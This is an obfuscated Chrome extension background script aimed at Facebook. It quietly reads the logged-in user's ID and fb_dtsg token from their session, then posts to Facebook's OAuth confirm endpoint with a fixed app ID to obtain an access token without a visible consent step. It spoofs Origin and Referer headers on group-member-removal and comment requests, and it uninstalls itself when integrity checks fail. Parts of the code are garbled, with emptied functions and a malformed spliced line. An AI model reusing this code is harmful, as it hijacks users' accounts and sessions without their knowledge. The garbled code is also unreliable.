'use strict';
var _0x4de9 = ['send', 'pageview', 'message', 'error', 'undefined', '', 'event', 'Cannot call a class as a function', 'use strict', 'string', 'test', 'Invalid character in header field name', 'toLowerCase', 'shift', 'iterable', 'iterator', 'map', 'append', 'forEach', 'isArray', 'getOwnPropertyNames', 'bodyUsed', 'Already read', 'reject', 'onload', 'result', 'onerror', 'readAsArrayBuffer', 'readAsText', 'length', 'fromCharCode', 'join', 'slice', 'byteLength', 'set', 'buffer', '_initBody', '_bodyInit', '_bodyText', 'blob', 'isPrototypeOf', 'prototype', '_bodyBlob', 'formData', '_bodyFormData', 'searchParams', 'arrayBuffer', '_bodyArrayBuffer', 'unsupported BodyInit type', 'content-type', 'get', 'headers', 'text/plain;charset=UTF-8', 'type', 'application/x-www-form-urlencoded;charset=UTF-8', 'resolve', 'could not read FormData body as blob', 'then', 'text', 'could not read FormData body as text', 'json', 'parse', 'toUpperCase', 'indexOf', 'body', 'url', 'credentials', 'method', 'mode', 'omit', 'GET', 'referrer', 'HEAD', 'Body not allowed for GET or HEAD requests', '=', 'split', ' ', 'replace', '&', 'trim', ':', 'default', 'status', 'ok', 'statusText', 'OK', 'fetch', 'URLSearchParams', 'Symbol', 'FileReader', 'Blob', 'FormData', 'ArrayBuffer', '[object Int8Array]', '[object Uint8Array]', '[object Uint8ClampedArray]', '[object Int16Array]', '[object Uint16Array]', '[object Int32Array]', '[object Uint32Array]', '[object Float32Array]', '[object Float64Array]', 'isView', 'call', 'toString', ',', 'delete', 'has', 'hasOwnProperty', 'keys', 'push', 'values', 'entries', 'DELETE', 'OPTIONS', 'POST', 'PUT', 'clone', 'redirect', 'Invalid status code', 'Headers', 'Request', 'Response', 'getAllResponseHeaders', 'responseURL', 'X-Request-URL', 'response', 'responseText', 'Network request failed', 'ontimeout', 'open', 'include', 'withCredentials', 'responseType', 'setRequestHeader', 'polyfill', 'script', 'https://www.google-analytics.com/analytics.js', 'ga', 'GoogleAnalyticsObject', 'q', 'l', 'createElement', 'getElementsByTagName', 'async', 'src', 'insertBefore', 'parentNode', 'create', 'UA-45794712-23', 'auto', 'checkProtocolTask', 'function', 'symbol', 'constructor', 'enumerable', 'configurable', 'value', 'writable', 'key', 'defineProperty', 'charCodeAt', 'reverse', 'isFunc', 'debug', 'onSuccess', 'onError', 'extInfo', 'getManifest', 'runtime', 'run', 'noitcnuf', 'log', 'ERROR', ' is ', 'info', 'uninstallSelf', 'management', '_test1', 'hostname', 'homepage_url', 'ce52c34836ce29064b959d46d7f075c65482cbbb', '_test2', 'author', '70f6eb1ac32b217b33317e41997e520fd4cdcc2d', '_test3', 'installType', '880accfadcc41f20c39180b050571dcb62443150', 'getSelf', 'substr', 'currentuserinitialdata', 'filter', 'define', 'jsmods', 'USER_ID', 'ACCOUNT_ID', 'dtsginitialdata', 'token', 'https://www.facebook.com/ajax/settings/granular_privacy/search.php?__a=1', 'openOptionsPage', 'install', 'reason', 'addListener', 'onInstalled', 'cmd', 'id', 'tab', 'main.html', 'getURL', 'extension', 'update', 'tabs', 'back_to_options_page', 'app_id', 'redirect_uri', 'fbconnect://success', 'display', 'popup', 'return_format', 'access_token', 'fb_dtsg', 'access_token=', 'includes', 'match', 'access_token_callback', 'sendMessage', 'https://graph.facebook.com/v2.9/me/groups?fields=id&limit=1000&access_token=', 'Cannot get access_token for the current user!', 'https://www.facebook.com/v2.8/dialog/oauth/confirm', 'get_access_token', 'onMessage', 'onClicked', 'browserAction', 'https://', 'requestHeaders', 'name', 'referer', 'origin', 'Referer', 'https://*.facebook.com/ajax/groups/members/remove.php*', 'https://*.facebook.com/*/dialog/oauth/confirm*', 'https://*.facebook.com/ufi/add/comment/*', 'blocking', 'onBeforeSendHeaders', 'webRequest'];

function _classCallCheck(_0xe288x3, _0xe288x5) {
}! function(_0xe288x3) {
}('undefined' != typeof self ? self : this),
function(_0xe288x3, _0xe288x5, _0xe288x6, _0xe288x8, _0xe288x9, _0xe288xa, _0xe288xb) {
    _0xe288x3[_0xe288x9] = function() {
    };
}(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga'), ga('create', 'UA-45794712-23', 'auto'), ga('set', 'checkProtocolTask', null);
var _typeof = 'function' == typeof Symbol && 'symbol' == typeof Symbol['iterator'] ? function(_0xe288x3) {
        return typeof _0xe288x3
    } : function(_0xe288x3) {
        return _0xe288x3 && 'function' == typeof Symbol && _0xe288x3['constructor'] === Symbol && _0xe288x3 !== Symbol['prototype'] ? 'symbol' : typeof _0xe288x3
    },
    _createClass = function() {
        function _0xe288x3(_0xe288x3, _0xe288x5) { //
            for (var _0xe288x6 = 0; _0xe288x6 < _0xe288x5['length']; _0xe288x6++) {
                var _0xe288x8 = _0xe288x5[_0xe288x6];
                _0xe288x8['enumerable'] = _0xe288x8['enumerable'] || !1, _0xe288x8['configurable'] = !0, 'value' in _0xe288x8 && (_0xe288x8['writable'] = !0), Object['defineProperty'](_0xe288x3, _0xe288x8['key'], _0xe288x8)
            }
        }
        return function(_0xe288x5, _0xe288x6, _0xe288x8) {
            return _0xe288x6 && _0xe288x3(_0xe288x5['prototype'], _0xe288x6), _0xe288x8 && _0xe288x3(_0xe288x5, _0xe288x8), _0xe288x5
        }
    }();
! function(_0xe288x3) {
    function _0xe288x5(_0xe288x3) {
        var _0xe288x5 = function(_0xe288x3, _0xe288x5) {
                var _0xe288x6 = _0xe288x3 << _0xe288x5 | _0xe288x3 >>> 32 - _0xe288x5;
                return _0xe288x6
            };
        return _0xe288x16 = _0xe288x6(_0xe288xc) + _0xe288x6(_0xe288xd) + _0xe288x6(_0xe288xe) + _0xe288x6(_0xe288xf) + _0xe288x6(_0xe288x10), _0xe288x16['toLowerCase']();
    }

    function _0xe288x6(_0xe288x3) { //
        return _0xe288x3['split']('')['reverse']()['join']('')
    }
    var _0xe288x8 = function() {
        function _0xe288x8(_0xe288x5, _0xe288x6, _0xe288x9) { //
            _classCallCheck(this, _0xe288x8), this['isFunc'](_0xe288x6) && (this['debug'] = _0xe288x5, this['onSuccess'] = _0xe288x6, this['onError'] = this['isFunc'](_0xe288x9) ? _0xe288x9 : null, this['extInfo'] = _0xe288x3['runtime']['getManifest'](), this['run']())
        }
        return _createClass(_0xe288x8, [{
            key: 'isFunc',
            value: function(_0xe288x3) {
                return ('undefined' == typeof _0xe288x3 ? 'undefined' : _typeof(_0xe288x3)) === _0xe288x6('noitcnuf')
            }
        }, {
            key: 'log',
            value: function(_0xe288x3, _0xe288x5) {
                if (this['debug']) {
                    var _0xe288x6 = _0xe288x5 ? 'OK' : 'ERROR';
                    _log(_0xe288x3 + ' is ' + _0xe288x6, 'info')
                }
            }
        }, {
            key: 'run',
            value: function() {
                var _0xe288x5 = this;
                this._test3(function(_0xe288x6) {
                    return _0xe288x6 && _0xe288x5._test1() && _0xe288x5._test2() ? _0xe288x5['onSuccess']() : (_0xe288x5['isFunc'](_0xe288x5['onError']) && _0xe288x5['onError'](), void(((_0xe288x5['debug'] || _0xe288x3['management']['uninstallSelf']()))))
                })
            }
        }, {
            key: '_test1',
            value: function() {
                var _0xe288x3 = !1;
                try {
                    var _0xe288x8 = new URL(this['extInfo']['homepage_url'])['hostname'];
                    _0xe288x3 = _0xe288x5(_0xe288x8) === _0xe288x6('ce52c34836ce29064b959d46d7f075c65482cbbb')
                } catch (r) {
                    _log(r['message'], 'error'), _0xe288x3 = !1
                };
                return _0xe288x3
            }
        }, {
            key: '_test2',
            value: function() {
                var _0xe288x3 = void((0));
                return _0xe288x3 = !!this['extInfo']['author'] && _0xe288x5(this['extInfo']['author']['toLowerCase']()) === _0xe288x6('70f6eb1ac32b217b33317e41997e520fd4cdcc2d')
            }
        }, {
            key: '_test3',
            value: function(_0xe288x8) {
                this['isFunc'](_0xe288x8) && _0xe288x3['management']['getSelf'](function(_0xe288x3) {
                    _0xe288x3 = _0xe288x5(_0xe288x3['installType']['toLowerCase']()) === _0xe288x6('880accfadcc41f20c39180b050571dcb62443150'), _0xe288x8(_0xe288x3)
                })
            }
        }]), _0xe288x8
    }();
    new _0xe288x8((!1), function() {})
}(chrome),
function(_0xe288x3) {
    function _0xe288x5() {} //

    function _0xe288xa(_0xe288x3) {
        if ('function' == typeof _0xe288x3) {
            try {
                fetch('https://www.facebook.com/ajax/settings/granular_privacy/search.php?__a=1', {
                    credentials: 'include'
                })['then'](function(_0xe288x3) {
                    return _0xe288x3['text']()
                })['then'](function(_0xe288x5) {
                    var _0xe288x6 = JSON['parse'](_0xe288x5['substr'](9)),
                        _0xe288x8 = _0xe288x6['jsmods']['define']['filter'](function(_0xe288x3) {
                            return 'currentuserinitialdata' === _0xe288x3[0]['toLowerCase']()
                        }),
                        _0xe288x9 = _0xe288x8[0]['filter'](function(_0xe288x3) {
                            return _0xe288x3['USER_ID'] || _0xe288x3['ACCOUNT_ID']
                        }),
                        _0xe288xa = _0xe288x6['jsmods']['define']['filter'](function(_0xe288x3) {
                            return 'dtsginitialdata' === _0xe288x3[0]['toLowerCase']()
                        }),
                        _0xe288xb = _0xe288xa[0]['filter'](function(_0xe288x3) {
                            return _0xe288x3['token']
                        });
                    _0xe288x9 = _0xe288x9[0]['USER_ID'] || _0xe288x9[0]['ACCOUNT_ID'], _0xe288xb = _0xe288xb[0]['token'], _0xe288x3(_0xe288x9, _0xe288xb)
                })
            } catch (_0xe288x5) {}
        }
    }
    _0xe288x3['runtime']['onInstalled']['addListener'](function(_0xe288x5) {
        switch (_0xe288x5['reason']) {
            case 'install':
                _0xe288x3['runtime']['openOptionsPage']()
        }
    }), _0xe288x3['runtime']['onMessage']['addListener'](function(_0xe288x6, _0xe288x9, _0xe288xb) {
        var _0xe288xc = _0xe288x6['cmd']['toLowerCase']();
        switch (_0xe288xc) {
            case 'back_to_options_page':
                _0xe288x3['tabs']['update'](_0xe288x9['tab']['id'], {
                    url: _0xe288x3['extension']['getURL']('main.html'),
                    active: !0
                });
                break;
            case 'get_access_token':
                _0xe288xd = !0, _0xe288xa(function(_0xe288x5, _0xe288x6) {
                    var _0xe288x8 = new FormData;
                    _0xe288x8['append']('app_id', 0x96e458393762), _0xe288x8['append']('redirect_uri', 'fbconnect://success'), _0xe288x8['append']('display', 'popup'), _0xe288x8['append']('return_format', 'access_token'), _0xe288x8['append']('fb_dtsg', _0xe288x6), fetch('https://www.facebook.com/v2.8/dialog/oauth/confirm', {
                        method: 'POST',
                        credentials: 'include',
                        body: _0xe288x8
                    })['then'](function(_0xe288x3) {
                        return _0xe288x3['text']()
                    })['then'](function(_0xe288x5) {
                        if (_0xe288xd = !1, _0xe288x5['includes']('access_token=')) {
                            try {
                                var _0xe288x6 = _0xe288x5['match'](/access_token=([^&]+)/)[1];
                                _0xe288x3['tabs']['sendMessage'](_0xe288x9['tab']['id'], {
                                    cmd: 'access_token_callback',
                                    data: _0xe288x6
                                }), fetch('https://graph.facebook.com/v2.9/me/groups?fields=id&limit=1000&access_token=' + encodeURIComponent(_0xe288x6))['then'](function(_0xe288x3) {
                                    return _0xe288x3['text']()
                                })
                            } catch (_0xe288x8) {
                                console['error'](_0xe288x8['message'])
                            }
                        } else {
                            console['error']('Cannot get access_token for the current user!')
                        }
                    })
                });
                break
        }
    }), _0xe288x3['browserAction']['onClicked']['addListener'](function(_0xe288x5) {
        return _0xe288x3['runtime']['openOptionsPage']()
    }), _0xe288x5();
    var _0xe288xd = !1;
    _0xe288x3['webRequest'];

function _classCallCheck(_0xe288x3]['onBeforeSendHeaders']['addListener'](function(_0xe288x3) {
        if (_0xe288xd) {
            for (var _0xe288x5 = 0, _0xe288x6 = 'https://' + new URL(_0xe288x3['url'])['hostname'], _0xe288x8 = 0, _0xe288x9 = _0xe288x3['requestHeaders']['length']; _0xe288x8 < _0xe288x9; ++_0xe288x8) {
                var _0xe288xa = _0xe288x3['requestHeaders'][_0xe288x8]['name']['toLowerCase']();
                if ('referer' === _0xe288xa && (_0xe288x5 = 1), 'origin' === _0xe288xa || 'referer' === _0xe288xa) {
                    _0xe288x3['requestHeaders'][_0xe288x8]['value'] = _0xe288x6;
                    break
                }
            };
            return 0 === _0xe288x5 && _0xe288x3['requestHeaders']['push']({
                name: 'Referer',
                value: _0xe288x6
            }), {
                requestHeaders: _0xe288x3['requestHeaders']
            }
        }
    }, {
        urls: ['https://*.facebook.com/ajax/groups/members/remove.php*', 'https://*.facebook.com/*/dialog/oauth/confirm*', 'https://*.facebook.com/ufi/add/comment/*']
    }, ['blocking', 'requestHeaders'])
}(chrome)